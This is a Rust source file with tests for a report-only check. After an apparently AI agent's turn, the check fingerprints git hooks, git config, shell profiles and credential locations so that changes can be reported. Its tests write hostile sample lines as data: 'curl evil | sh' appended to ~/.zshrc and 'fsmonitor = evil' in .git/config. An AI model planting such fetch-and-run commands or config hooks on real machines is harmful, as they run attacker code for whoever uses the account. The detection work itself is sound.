//! WP-178 items 3.3 and 3.4 and review r2 MED-3: fingerprints for the report-only after-turn check on first-mate turns.
//!
//! Git status cannot see `.git/hooks` or `.git/config` (checkout_guard.rs), so the check takes its own fingerprints. Every
//! protected place in the shared list (`protectedGlobs`, the same globs the TypeScript report names, and the shell
//! profiles) is fingerprinted by content: a file up to 1 MiB by hash, a larger one by size and time. The secret places
//! (SSH keys, cloud logins, keychains; the `homeSecrets` section) are fingerprinted by size and modified time only, never
//! by content, so the check never reads a key. Symlinked secret folders are followed, to a fixed depth. Nothing is
//! blocked here; the TypeScript side names what changed.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::UNIX_EPOCH;

use sha2::{Digest, Sha256};

use crate::delivery::protected::{home_secrets, protected_globs};

/// Files bigger than this are fingerprinted by size and time rather than read, so a huge file cannot stall a turn.
const MAX_HASHED_BYTES: u64 = 1_048_576;
/// A bound on the walk of one place, so a folder with a very large tree cannot stall a turn.
const MAX_PLACE_ENTRIES: usize = 500;
/// How deep a `**` walk or a secret folder goes.
const MAX_DEPTH: usize = 6;

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// The git dir of a checkout (its common dir, so a worktree's hooks are the repo's), or None when `cwd` is not a repo.
fn common_git_dir(cwd: &Path) -> Option<PathBuf> {
    let out = crate::git_cmd::git()
        .arg("-C")
        .arg(cwd)
        .args(["rev-parse", "--git-common-dir"])
        .stdin(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if text.is_empty() {
        return None;
    }
    let path = PathBuf::from(text);
    Some(if path.is_absolute() {
        path
    } else {
        cwd.join(path)
    })
}

fn stat_value(meta: &std::fs::Metadata) -> String {
    let secs = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
        .unwrap_or(0);
    format!("size:{}:mtime:{secs}", meta.len())
}

/// A file, by content hash; a huge file by size and time (it is still caught when it changes). Follows a link.
fn fingerprint_file(path: &Path) -> Option<String> {
    let meta = std::fs::metadata(path).ok()?;
    if !meta.is_file() {
        return None;
    }
    if meta.len() > MAX_HASHED_BYTES {
        return Some(stat_value(&meta));
    }
    std::fs::read(path).ok().map(|bytes| sha256_hex(&bytes))
}

/// A secret place by size and time only, keyed `~/<relative path>`. Follows symlinked folders, to `depth` levels.
fn secret_stat(dir: &Path, key: &str, depth: usize, out: &mut BTreeMap<String, String>) {
    if out.len() >= MAX_PLACE_ENTRIES * 8 {
        return;
    }
    let Ok(meta) = std::fs::metadata(dir) else {
        return;
    };
    if meta.is_file() {
        out.insert(key.to_string(), stat_value(&meta));
        return;
    }
    if !meta.is_dir() || depth == 0 {
        return;
    }
    for name in child_names(dir) {
        secret_stat(&dir.join(&name), &format!("{key}/{name}"), depth - 1, out);
    }
}

/// The names in a folder, sorted, bounded.
fn child_names(dir: &Path) -> Vec<String> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut names: Vec<String> = entries
        .filter_map(|e| e.ok().map(|e| e.file_name().to_string_lossy().into_owned()))
        .collect();
    names.sort();
    names.truncate(MAX_PLACE_ENTRIES * 4);
    names
}

/// A name against one glob segment: `*` is any run of characters, the rest must match exactly.
fn wildcard_match(pattern: &str, name: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    let (first, last) = (parts[0], parts[parts.len() - 1]);
    if parts.len() == 1 {
        return pattern == name;
    }
    if !name.starts_with(first) || !name.ends_with(last) || name.len() < first.len() + last.len() {
        return false;
    }
    let mut rest = &name[first.len()..name.len() - last.len()];
    for middle in &parts[1..parts.len() - 1] {
        match rest.find(middle) {
            Some(at) => rest = &rest[at + middle.len()..],
            None => return false,
        }
    }
    true
}

fn join(rel: &str, name: &str) -> String {
    if rel.is_empty() {
        name.to_string()
    } else {
        format!("{rel}/{name}")
    }
}

fn is_real_dir(path: &Path) -> bool {
    // A `**` walk does not follow a link to a folder: a link back up the tree would loop.
    std::fs::symlink_metadata(path).is_ok_and(|meta| meta.is_dir())
}

/// Every file a glob names under `root`, keyed `prefix + relative path`, fingerprinted by content.
fn glob_into(root: &Path, prefix: &str, pattern: &str, out: &mut BTreeMap<String, String>) {
    let segments: Vec<&str> = pattern
        .split('/')
        .filter(|s| !s.is_empty() && *s != ".")
        .collect();
    let mut found = BTreeMap::new();
    walk(root, prefix, "", &segments, &mut found, 0);
    out.extend(found);
}

fn walk(
    dir: &Path,
    prefix: &str,
    rel: &str,
    segments: &[&str],
    found: &mut BTreeMap<String, String>,
    depth: usize,
) {
    if found.len() >= MAX_PLACE_ENTRIES || depth > MAX_DEPTH {
        return;
    }
    let Some((first, rest)) = segments.split_first() else {
        return;
    };
    if *first == "**" {
        if rest.is_empty() {
            collect_all(dir, prefix, rel, found, depth);
            return;
        }
        // Zero folders, then every real folder below.
        walk(dir, prefix, rel, rest, found, depth + 1);
        for name in child_names(dir) {
            let child = dir.join(&name);
            if is_real_dir(&child) {
                walk(
                    &child,
                    prefix,
                    &join(rel, &name),
                    segments,
                    found,
                    depth + 1,
                );
            }
        }
        return;
    }
    let names: Vec<String> = if first.contains('*') {
        child_names(dir)
            .into_iter()
            .filter(|name| wildcard_match(first, name))
            .collect()
    } else if dir.join(first).symlink_metadata().is_ok() {
        vec![first.to_string()]
    } else {
        Vec::new()
    };
    for name in names {
        let child = dir.join(&name);
        let child_rel = join(rel, &name);
        if rest.is_empty() {
            if let Some(value) = fingerprint_file(&child) {
                found.insert(format!("{prefix}{child_rel}"), value);
            }
        } else if std::fs::metadata(&child).is_ok_and(|meta| meta.is_dir()) {
            walk(&child, prefix, &child_rel, rest, found, depth + 1);
        }
    }
}

fn collect_all(
    dir: &Path,
    prefix: &str,
    rel: &str,
    found: &mut BTreeMap<String, String>,
    depth: usize,
) {
    if depth > MAX_DEPTH || found.len() >= MAX_PLACE_ENTRIES {
        return;
    }
    for name in child_names(dir) {
        let child = dir.join(&name);
        let child_rel = join(rel, &name);
        if is_real_dir(&child) {
            collect_all(&child, prefix, &child_rel, found, depth + 1);
        } else if let Some(value) = fingerprint_file(&child) {
            found.insert(format!("{prefix}{child_rel}"), value);
        }
    }
}

/// The fingerprints for one turn: every protected place from the shared list, by content (`~/` places under home, `.git`
/// places under the checkout's common git dir, the rest under the checkout), then the shell profiles, then the secret
/// places by size and time.
pub fn fingerprints(cwd: &Path, home: Option<&Path>) -> Result<BTreeMap<String, String>, String> {
    let mut out = BTreeMap::new();
    let git = common_git_dir(cwd);
    for glob in protected_globs()? {
        if let Some(rest) = glob.pattern.strip_prefix("~/") {
            if let Some(home) = home {
                glob_into(home, "~/", rest, &mut out);
            }
        } else if let Some(rest) = glob.pattern.strip_prefix(".git/") {
            if let Some(git) = &git {
                glob_into(git, ".git/", rest, &mut out);
            }
        } else {
            glob_into(cwd, "", &glob.pattern, &mut out);
        }
    }
    let list = home_secrets()?;
    if let Some(home) = home {
        for file in &list.shell_profiles {
            glob_into(home, "~/", file, &mut out);
        }
        for dir in &list.dirs {
            secret_stat(&home.join(dir), &format!("~/{dir}"), MAX_DEPTH, &mut out);
        }
        for file in list.files.iter().chain(list.cli_login_files.iter()) {
            if let Some(meta) = std::fs::metadata(home.join(file))
                .ok()
                .filter(|m| m.is_file())
            {
                out.insert(format!("~/{file}"), stat_value(&meta));
            }
        }
    }
    Ok(out)
}

#[tauri::command]
pub async fn firstmate_protected_fingerprints(
    cwd: String,
) -> Result<BTreeMap<String, String>, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let home = std::env::var_os("HOME").map(PathBuf::from);
        fingerprints(Path::new(&cwd), home.as_deref())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn temp_dir(tag: &str) -> PathBuf {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let dir = std::env::temp_dir().join(format!(
            "protected-paths-{tag}-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::canonicalize(&dir).unwrap()
    }

    fn git_repo(tag: &str) -> PathBuf {
        let repo = temp_dir(tag);
        let status = crate::git_cmd::git()
            .arg("init")
            .arg("-q")
            .arg(&repo)
            .status()
            .unwrap();
        assert!(status.success());
        std::fs::create_dir_all(repo.join(".git").join("hooks")).unwrap();
        repo
    }

    #[test]
    fn a_changed_git_hook_is_fingerprinted_under_the_checkout_key() {
        let repo = git_repo("hook");
        let hook = repo.join(".git").join("hooks").join("pre-commit");
        std::fs::write(&hook, "echo one\n").unwrap();
        let before = fingerprints(&repo, None).unwrap();
        std::fs::write(&hook, "echo two\n").unwrap();
        let after = fingerprints(&repo, None).unwrap();
        assert!(
            before.contains_key(".git/hooks/pre-commit"),
            "keys: {:?}",
            before.keys()
        );
        assert_ne!(
            before.get(".git/hooks/pre-commit"),
            after.get(".git/hooks/pre-commit")
        );
        let _ = std::fs::remove_dir_all(&repo);
    }

    #[test]
    fn a_changed_git_config_is_fingerprinted_under_the_checkout_key() {
        let repo = git_repo("config");
        std::fs::write(repo.join(".git").join("config"), "[core]\n").unwrap();
        let before = fingerprints(&repo, None).unwrap();
        std::fs::write(
            repo.join(".git").join("config"),
            "[core]\n\tfsmonitor = evil\n",
        )
        .unwrap();
        let after = fingerprints(&repo, None).unwrap();
        assert_ne!(before.get(".git/config"), after.get(".git/config"));
        let _ = std::fs::remove_dir_all(&repo);
    }

    #[test]
    fn a_secret_place_is_fingerprinted_by_size_and_time_never_by_content() {
        let home = temp_dir("secret");
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        let key = home.join(".ssh").join("id_ed25519");
        std::fs::write(&key, "PRIVATE-KEY-BODY").unwrap();
        let before = fingerprints(&home, Some(&home)).unwrap();
        std::fs::write(&key, "PRIVATE-KEY-BODY-CHANGED-LENGTH").unwrap();
        let after = fingerprints(&home, Some(&home)).unwrap();
        assert!(
            before.contains_key("~/.ssh/id_ed25519"),
            "keys: {:?}",
            before.keys()
        );
        assert_ne!(
            before.get("~/.ssh/id_ed25519"),
            after.get("~/.ssh/id_ed25519")
        );
        assert!(
            !before.values().any(|v| v.contains("PRIVATE-KEY")),
            "a fingerprint must never carry the key's content"
        );
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_folder_that_is_not_a_git_checkout_has_no_git_keys() {
        let plain = temp_dir("plain");
        let found = fingerprints(&plain, None).unwrap();
        assert!(
            found.keys().all(|k| !k.starts_with(".git/")),
            "keys: {:?}",
            found.keys()
        );
        let _ = std::fs::remove_dir_all(&plain);
    }
}

/// Review r2 repro for PR #208: the after-turn check names shell profiles (protectedPaths.ts, and the activity-row test
/// uses `~/.zshrc`), but the fingerprints never include them, so an edited shell profile is never reported. Red at
/// 73263a6a7.
#[cfg(test)]
mod review_r2_repro {
    use super::*;

    #[test]
    fn an_edited_shell_profile_is_fingerprinted() {
        let home = std::env::temp_dir().join(format!("pp-r2-{}", std::process::id()));
        std::fs::create_dir_all(&home).unwrap();
        std::fs::write(home.join(".zshrc"), "export A=1\n").unwrap();
        let before = fingerprints(&home, Some(&home)).unwrap();
        std::fs::write(home.join(".zshrc"), "export A=1\ncurl evil | sh\n").unwrap();
        let after = fingerprints(&home, Some(&home)).unwrap();
        let _ = std::fs::remove_dir_all(&home);
        assert!(
            before.contains_key("~/.zshrc") && before.get("~/.zshrc") != after.get("~/.zshrc"),
            "~/.zshrc is not fingerprinted, so the after-turn check never reports it: {:?}",
            before.keys().collect::<Vec<_>>()
        );
    }
}
